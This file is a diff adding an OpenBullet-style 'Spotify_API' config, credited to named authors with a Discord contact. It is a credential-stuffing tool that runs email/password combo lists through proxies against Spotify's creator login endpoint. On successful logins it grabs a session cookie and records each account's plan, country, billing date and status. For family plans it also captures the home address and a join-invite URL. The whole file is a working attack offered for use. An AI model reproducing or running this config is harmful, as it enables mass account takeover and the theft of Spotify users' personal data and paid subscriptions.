@@ -1,0 +1,141 @@
+[SETTINGS]
+{
+  "Name": "Spotify_API",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-13T06:40:29.9037672+00:00",
+  "AdditionalInfo": "For suggestions or feedback write me on Discord: Pirate#6381",
+  "Author": "Movi (FIXED)",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#req_login REQUEST POST "https://creator.wg.spotify.com/creator-auth-proxy/api/token" 
+  CONTENT "client_id=5029ea5811a6406e9dddd88e6d9ce547&grant_type=password&password=<PASS>&scope=streaming%20user-read-email%20ugc-image-upload&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "User-Agent: Artists/1.4.17 (com.spotify.s4a; build:141700004; iOS 13.4.1) Alamofire/4.7.3" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain;q=0.2, */*;q=0.1" 
+  HEADER "App-Platform: iOS" 
+  HEADER "Spotify-App: S4A" 
+  HEADER "Accept-Language: fr-FR;q=1.0" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+  HEADER "Spotify-App-Version: 1.4.17" 
+
+#verify_login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+#get_token PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+#authentication REQUEST POST "https://creator.wg.spotify.com/s4a-service/v1/auth" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "App-Platform: iOS" 
+  HEADER "Spotify-App: S4A" 
+  HEADER "Spotify-App-Version: 1.4.17" 
+  HEADER "User-Agent: Artists/1.4.17 (com.spotify.s4a; build:141700004; iOS 13.4.1) Alamofire/4.7.3" 
+  HEADER "Accept-Language: fr-FR;q=1.0" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+
+#spdc PARSE "<SOURCE>" JSON "value" -> VAR "spdc" 
+
+#account_redirect REQUEST GET "https://www.spotify.com/us/api/account/overview/" 
+  
+  COOKIE "sp_dc: <spdc>" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Accept-Language: fr-fr" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#free_check KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "plan\":{\"name\":\"Spotify Free" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "plan\":{\"name\":\"Spotify Free" 
+    KEY "plan\":{\"name\":\"Spotify Premium" 
+
+#country PARSE "<SOURCE>" LR "Country\",\"value\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#country_capture FUNCTION ToLowercase "<Country>" -> VAR "c2" 
+
+#plan PARSE "<SOURCE>" LR "plan\":{\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+#status PARSE "<SOURCE>" LR "overline\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+#billing PARSE "<SOURCE>" LR "recurring-date\\u0022\\u003E" "\\u003C\\/b\\u003E.\"" -> VAR "recurring" 
+
+#billing_capture FUNCTION Replace "\\/" "/" "<recurring>" -> CAP "Next Billing" 
+
+IF "<SOURCE>" Contains "Spotify Premium Family"
+
+#family REQUEST GET "https://www.spotify.com/us/home-hub/api/v1/family/home/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: fr-fr" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#address PARSE "<SOURCE>" LR "address\":\"" "\"" CreateEmpty=FALSE -> CAP "Address" 
+
+#occ FUNCTION CountOccurrences "isChildAccount" "<SOURCE>" -> VAR "occurences" 
+
+#Invites_capture FUNCTION Constant "<occurences>/6" -> CAP "Invites Left" 
+
+#invite_token PARSE "<SOURCE>" LR "inviteToken\":\"" "\"" -> VAR "tok" 
+
+#Invite_link_conversion FUNCTION Constant "https://www.spotify.com/<c2>/family/join/invite/<tok>/" -> CAP "Invite Url" 
+
+ELSE
+ENDIF
+
+#Credit FUNCTION Constant "PirateRAVI" -> CAP "Config By" 
+
